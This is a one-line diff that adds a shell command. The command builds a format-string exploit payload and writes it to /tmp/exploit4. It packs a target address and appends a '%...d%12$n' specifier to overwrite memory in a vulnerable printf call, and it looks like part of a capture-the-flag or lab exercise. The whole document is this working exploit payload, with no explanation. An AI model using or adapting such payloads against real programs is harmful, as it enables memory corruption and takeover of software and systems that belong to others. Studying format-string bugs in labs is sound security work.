@@ -1,0 +1,1 @@
+python -c 'import struct; print(struct.pack("<I", 0x8049810) + b"%16930112d%12$n")' > /tmp/exploit4
